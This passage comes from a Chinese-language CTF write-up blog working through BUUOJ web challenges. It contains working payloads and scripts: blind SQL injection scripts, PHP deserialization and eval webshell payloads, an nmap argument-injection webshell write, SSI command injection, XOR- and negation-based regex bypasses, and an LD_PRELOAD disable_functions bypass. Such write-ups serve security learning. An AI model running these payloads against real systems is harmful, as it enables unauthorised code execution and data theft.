获取flag            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)            r &#x3D; requests.get(db_url)            if &quot;Click&quot; in r.text:                Min&#x3D;Mid+1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            else:                Max&#x3D;Mid-1                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2                pass            pass        name&#x3D;name+chr(Mid)        print(name)        if Mid &#x3D;&#x3D; 31:            break        time.sleep(0.5)  if __name__&#x3D;&#x3D;&quot;__main__&quot;:    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;    db_Len &#x3D; get_DBlen(url)    db_Name &#x3D; get_DBname(url,db_Len)    tb_name &#x3D; get_TBname(url)</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210906151816679.png" alt="image-20210906151816679"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150757059.png" alt="image-20210907150757059"></p><p>跳到time.php?source界面看看内容</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907150827681.png" alt="image-20210907150827681"></p><p>反序列化构造实现命令执行</p><p>system这里应该是过滤了，可以用assert代替</p><pre class="language-none"><code class="language-none">assert()简介：判断一个表达式是否成立。返回true or false。当参数为字符串时，会被当作php代码执行。例如 assert(&quot;phpinfo()&quot;)  &lt;&#x3D;&#x3D;&gt;  &lt;?phpinfo()?&gt;assert与eval的区别assert把整个字符串参数当php代码执行，eval把合法的php代码执行。</code></pre><p>payload：?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}</p><p>或者?data=O:8:&quot;HelloPhp&quot;:2:{s:1:&quot;a&quot;;s:16:&quot;eval($_POST[a]);&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;}然后post：a=phpinfo</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907151408539.png" alt="image-20210907151408539"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907153837010.png" alt="image-20210907153837010"></p><p>搜索flag就能找到</p><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>xff头的ssti注入，我好像之前做过一个差不多的</p><p>界面右上角ip可随意改变，因此可以利用readfile函数读flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907155218173.png" alt="image-20210907155218173"></p><h2 id="BJDCTF2020-EasySearch"><a href="#BJDCTF2020-EasySearch" class="headerlink" title="[BJDCTF2020]EasySearch"></a>[BJDCTF2020]EasySearch</h2><p>扫目录，发现index.php.swp界面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907202133630.png" alt="image-20210907202133630"></p><p>要让password前六位md5值为6d0bc1</p><p>爆破一下</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907203923885.png" alt="image-20210907203923885"></p><p>登录后抓包</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204116239.png" alt="image-20210907204116239"></p><p>这里可以看见一个shtml页面</p><p>进入后的页面</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204437473.png" alt="image-20210907204437473"></p><p>这里admin的位置是我们的用户名，这里利用了ssl注入</p><p><a href="https://blog.csdn.net/qq_40657585/article/details/84260844"> SSI注入漏洞_Hydra的博客-CSDN博客_ssi注入</a></p><p>模板就类似于</p><!--#exec cmd="文件名称"--><p>可以先用ls查看目录找到flag文件，再利用cat查看</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204923959.png" alt="image-20210907204923959"></p><p>访问页面找到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907204713176.png" alt="image-20210907204713176"></p><h2 id="BSidesCF-2019-Futurella"><a href="#BSidesCF-2019-Futurella" class="headerlink" title="[BSidesCF 2019]Futurella"></a>[BSidesCF 2019]Futurella</h2><p>f12源码里有flag</p><p>好久没做这么简单的了</p><h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>常见的nmap命令</p><p><a href="http://linux.51yip.com/search/nmap">nmap linux 命令 在线中文手册 (51yip.com)</a></p><p>选项 解释<br>-oN 标准保存<br>-oX XML保存<br>-oG Grep保存<br>-oA 保存到所有格式<br>-append-output 补充保存文件<br>选项-oG<br>将结果Grep保存。</p><p>nmap -F -oG test.txt 192.168.23.1<br>1<br>选项-oA<br>该选项可将扫描结果以标准格式、XML格式和Grep格式一次性保存，分别放在.nmap，.xml和.gnmap文件中。</p><p>nmap -F -oA test 192.168.3.2</p><p>这里就是要用nmap的 -oN命令写shell</p><pre class="language-none"><code class="language-none">&#39; -oN w4ke.txt &#39;</code></pre><p>返回host maybe down之后访问w4ke.txt</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907215022693.png" alt="image-20210907215022693"></p><p>所以可以试试写个一句话木马上去</p><pre class="language-none"><code class="language-none">&#39; -oN b.txt  &lt;?php eval($_POST[&#39;a&#39;]); ?&gt;&#39;</code></pre><p>返回了hacker，所以应该是有东西被过滤了</p><p>试了一下发现是php被过滤了</p><p>可以用其他的进行替代</p><pre class="language-none"><code class="language-none">&lt;?&#x3D;eval($_POST[a]);?&gt;</code></pre><p>利用post传参执行命令</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210907221126211.png" alt="image-20210907221126211"></p><p>参考链接 </p><p> <a href="https://blog.csdn.net/qq_43801002/article/details/107746582">网鼎杯 2020 朱雀组]Nmap_浩歌已行的博客-CSDN博客</a></p><p><a href="https://www.icode9.com/content-4-756152.html">网鼎杯 2020 朱雀组]Nmap (icode9.com)</a></p><h2 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h2><p>根据题目提示下载压缩包文件，里面存在三千多个php文件</p><p>每一个文件里都有shell，我们要找到一个能用的</p><pre class="language-none"><code class="language-none">import requestsimport osimport reurl &#x3D; &#39;http:&#x2F;&#x2F;22ffcd5e-b2cc-48c3-b7b7-4ba7bcc7d244.node4.buuoj.cn:81&#x2F;&#39;path &#x3D; r&#39;C:\Users\ethe\Desktop\www\src&#39;ptn_get &#x3D; re.compile(br&quot;\$_GET\[&#39;(\w+)&#39;\]&quot;)ptn_res &#x3D; re.compile(br&#39;success_hack&#39;)count &#x3D; 0for f in list(os.scandir(path)):    print(str(f)[11:-2])    count +&#x3D; 1    with open(f.path, &#39;rb&#39;) as fp:        data &#x3D; fp.read()    for get in set(ptn_get.findall(data)):        get &#x3D; get.decode(&#39;utf-8&#39;)        cmd &#x3D; &#39;echo &quot;success_hack&quot;;&#39;        r &#x3D; requests.get(url + f.name, params&#x3D;&#123;get: cmd&#125;)        if ptn_res.search(r.content) is not None:            print(f.name, get)            exit()</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221800930.png" alt="image-20210908221800930"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210908221812146.png" alt="image-20210908221812146"></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>题目提示xml，抓包后</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203429736.png" alt="image-20210909203429736"></p><p>猜应该是有xxe注入，直接上payload，发现没读取成功</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909203626014.png" alt="image-20210909203626014"></p><p>看一看dologin.php的源码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909204007128.png" alt="image-20210909204007128"></p><pre class="language-none"><code class="language-none">&lt;?php&#x2F;*** autor: c0ny1* date: 2018-2-7*&#x2F;$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;è´¦å·$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;å¯ç $result &#x3D; null;libxml_disable_entity_loader(false);$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);try&#123;$dom &#x3D; new DOMDocument();$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);$creds &#x3D; simplexml_import_dom($dom);$username &#x3D; $creds-&gt;username;$password &#x3D; $creds-&gt;password;if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);&#125;else&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);&#125;&#125;catch(Exception $e)&#123;$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());&#125;header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);echo $result;?&gt;</code></pre><p>但是从这个源码里也找不到flag</p><p>后边就是我看不懂的操作了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909210613519.png" alt="image-20210909210613519"></p><p>访问proc/net/arp文件查看有无可利用内网主机</p><p>尝试访问一下这个ip，报错</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210909211003923.png" alt="image-20210909211003923"></p><p>之后c段扫描，找到flag</p><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>这题感觉有点问题</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153230545.png" alt="image-20210912153230545"></p><p>写脚本找lv6</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153247599.png" alt="image-20210912153247599"></p><p>找到后</p><p>很明显钱不够</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153310649.png" alt="image-20210912153310649"></p><p>这里可以抓包改折扣，当折扣足够小的时候就出现一个重定向</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153400419.png" alt="image-20210912153400419"></p><p>接下来的步骤感觉就有点问题了，当直接在burp改路径的时候会直接跳过一个cookie的修改变成admin</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153441750.png" alt="image-20210912153441750"></p><p>但是直接在url栏修改会要求用户是admin</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153559514.png" alt="image-20210912153559514"></p><p>这就要求修改jwt的cookie</p><p><a href="https://www.cnblogs.com/cjsblog/p/9277677.html">认识JWT - 废物大师兄 - 博客园 (cnblogs.com)</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153646824.png" alt="image-20210912153646824"></p><p>这里的c-jwt-crack工具不会用，所以就跳过这部分吧</p><p>看登录后的源码看见<a href="http://www.zip路径/">www.zip路径</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912153753980.png" alt="image-20210912153753980"></p><p>下载压缩包后发现全为python文件</p><p>这里是利用了python反编译</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210912171400636.png" alt="image-20210912171400636"></p><p>pickle提供了一个简单的持久化功能。可以将对象以文件的形式存放在磁盘上。</p><p>pickle模块只能在python中使用，python中几乎所有的数据类型（列表，字典，集合，类等）都可以用pickle来序列化，<br>pickle序列化后的数据，可读性差，人一般无法识别。</p><p>p = pickle.loads(urllib.unquote(become))</p><p>urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 = value1 &amp; key2 = value2的形式pickle.loads(bytes_object): 从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</p><p>（1）pickle.dump(obj, file, [,protocol])</p><pre class="language-none"><code class="language-none">    函数的功能：将obj对象序列化存入已经打开的file中。   参数讲解：obj：想要序列化的obj对象。file:文件名称。protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（2）pickle.load(file)</p><pre class="language-none"><code class="language-none">    函数的功能：将file中的对象序列化读出。    参数讲解：file：文件名称。</code></pre><p>（3）pickle.dumps(obj[, protocol])</p><pre class="language-none"><code class="language-none">   函数的功能：将obj对象序列化为string形式，而不是存入文件中。   参数讲解：obj：想要序列化的obj对象。protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</code></pre><p>（4）pickle.loads(string)</p><pre class="language-none"><code class="language-none">   函数的功能：从string中读出序列化前的obj对象。   参数讲解：string：文件名称。 【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。而在__reduce__方法里面我们就进行读取flag.txt文件，并将该类序列化之后进行URL编码</code></pre><p>检测反序列化方法：</p><pre class="language-none"><code class="language-none">全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</code></pre><p>防御方法</p><pre class="language-none"><code class="language-none">1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法；2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzM0NTA4Mg==,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p><p>这里采用reduce</p><p>当__reduce__被定义之后，该对象被Pickle时就会被调用我们这里的eval用于重建对象的时候调用，即告诉python如何pickle他们供eval使用的即打开的文件flag.txt其他的参数我们可以不填</p><p>百度个脚本</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914214826558.png" alt="image-20210914214826558"></p><p>把这个值给become里放包就行</p><p>参考链接</p><p><a href="https://blog.csdn.net/bluehawksky/article/details/79027055"> Python魔法方法指南_宇宙浪子的专栏-CSDN博客</a></p><p><a href="https://xz.aliyun.com/t/2289#toc-4">Python反序列化漏洞的花式利用 - 先知社区 (aliyun.com)</a></p><hr><p>几天之后的补，jwt那个工具环境弄好了</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215436728.png" alt="image-20210914215436728"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210914215503070.png" alt="image-20210914215503070"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>才发现这就是寒假那个招新赛的原题</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133220927.png" alt="image-20210916133220927"></p><p>下划线可以用.来绕过，第二个if可以利用%0a换行绕过</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133253226.png" alt="image-20210916133253226"></p><p>要求本地登录</p><p>抓包改xff</p><p>里面有一段js代码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133335204.png" alt="image-20210916133335204"></p><p>post一个merak值，得到一段代码</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133404217.png" alt="image-20210916133404217"></p><p>代码审计</p><p>要求get进一个值且存在一个文件名为这个值的文件，内容为todat is a happy day</p><p>可以用data://text/plain,绕过</p><p>也可以用data:<em>//text/plain;base64,</em></p><p>然后存在一个file_get_contents读取传入的file</p><p>要让这个值经过change函数后为flag.php</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133828755.png" alt="image-20210916133828755"></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210916133839192.png" alt="image-20210916133839192"></p><p>传进去，拿flag</p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><pre class="language-none"><code class="language-none">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code&#x3D;$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;&#x2F;&#x2F; ?&gt;</code></pre><p>有eval函数，要试图命令执行，然后preg_match过滤了字母和数字，这里可以利用异或或者是url编码取反来绕过</p><p>取反</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182257977.png" alt="image-20210918182257977"></p><p>成功执行</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182348259.png" alt="image-20210918182348259"></p><p>这里可以看到禁用的函数</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918182433498.png" alt="image-20210918182433498"></p><p>或者利用异或</p><pre class="language-none"><code class="language-none">code&#x3D;$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183044112.png" alt="image-20210918183044112"></p><p>一样可以进入phpinfo页面</p><p>查看到禁用的函数后可以尝试利用取反或者异或写入一句话木马</p><p>//抄的payload</p><pre class="language-none"><code class="language-none">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6);  &#x2F;&#x2F;别忘了后面的分号或者：?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918183814123.png" alt="image-20210918183814123"></p><p>然后蚁剑链接，要执行读取flag的readflag二进制文件才能得到flag</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184148817.png" alt="image-20210918184148817"></p><p>但是</p><p>disable_functions禁用的函数太多导致shell不能执行命令</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184324855.png" alt="image-20210918184324855"></p><p>这里可以用蚁剑的插件（蚁剑yyds</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918184419549.png" alt="image-20210918184419549"></p><p>还有一种方法</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE<br>参考链接：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://www.freebuf.com/articles/web/192052.html">无需sendmail：巧用LD_PRELOAD突破disable_functions - FreeBuf网络安全行业门户</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXP地址</a></p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918194317240.png" alt="image-20210918194317240"></p><p>我看不懂，但我大受震撼</p><p>上传bypass.php</p><pre class="language-none"><code class="language-none">&lt;?php    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;&#x2F;b&gt;: http:&#x2F;&#x2F;site.com&#x2F;bypass_disablefunc.php?cmd&#x3D;pwd&amp;outpath&#x3D;&#x2F;tmp&#x2F;xx&amp;sopath&#x3D;&#x2F;var&#x2F;www&#x2F;bypass_disablefunc_x64.so &lt;&#x2F;p&gt;&quot;;    $cmd &#x3D; $_GET[&quot;cmd&quot;];    $out_path &#x3D; $_GET[&quot;outpath&quot;];    $evil_cmdline &#x3D; $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;&#x2F;b&gt;: &quot; . $evil_cmdline . &quot;&lt;&#x2F;p&gt;&quot;;    putenv(&quot;EVIL_CMDLINE&#x3D;&quot; . $evil_cmdline); &#x2F;&#x2F;设置EVIL_CMDLINE环境变量    $so_path &#x3D; $_GET[&quot;sopath&quot;];    putenv(&quot;LD_PRELOAD&#x3D;&quot; . $so_path);  &#x2F;&#x2F;加载恶意动态库    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);  &#x2F;&#x2F;利用mail函数触发恶意函数，跳转至__attribute__ ((__constructor__))修饰的函数。    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;&#x2F;b&gt;: &lt;br &#x2F;&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;&#x2F;p&gt;&quot;;     unlink($out_path);?&gt;</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193756871.png" alt="image-20210918193756871"></p><p>最终payload</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;68a9a191-87dd-4067-ac30-321118de4427.node4.buuoj.cn:81&#x2F;?code&#x3D;$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;include(%27&#x2F;var&#x2F;tmp&#x2F;bypass.php%27)&amp;cmd&#x3D;&#x2F;readflag&amp;outpath&#x3D;&#x2F;tmp&#x2F;tmpfile&amp;sopath&#x3D;&#x2F;var&#x2F;tmp&#x2F;bypass_disablefunc_x64.so</code></pre><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918193729344.png" alt="image-20210918193729344"></p><p>参考链接</p><p><a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/#bypass-disable-functions">bypass_disable_functions | 0xCreed (jxustctf.top)</a></p><p>[<a href="https://www.cnblogs.com/yesec/p/12483631.html">BUUOJ记录] [极客大挑战 2019]RCE ME - Ye&#39;sBlog - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">极客大挑战 2019]RCE ME_末初 · mochu7-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105656737?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.no_search_link">极客大挑战 2019]RCE ME（取反、异或绕过正则表达式、bypass disable_function）_WHOAMIAnony的博客-CSDN博客_异或绕过</a></p><h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223822994.png" alt="image-20210918223822994"></p><p>不知道密码，sql注入也不成功</p><p>直接把cookie改成username=cookie就行了，不清楚这题在考啥。。。</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918223845191.png" alt="image-20210918223845191"></p><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>布尔盲注，过滤了空格</p><p>(ascii(substr(database(),{},1))={})&quot;.format(i,j)</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235150704.png" alt="image-20210918235150704"></p><p>(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))={})</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918234900927.png" alt="image-20210918234900927"></p><p>(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),{},1))={})</p><p><img src="https://gitee.com/E_theNULL/picture/raw/master/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210918235644493.png" alt="image-20210918235644493"></p><p>(ascii(substr((select(group_concat(value))from(flag))</p><p>脚本：</p><pre class="language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;ff19146a-59b8-4bd0-8ded-5bf195180739.node4.buuoj.cn:81&#x2F;?stunum&#x3D;0^&quot;data &#x3D; &#39;&#39;k &#x3D; 0for i in range(13,50):    k &#x3D; 0    for j in range(43,127):        gets &#x3D; 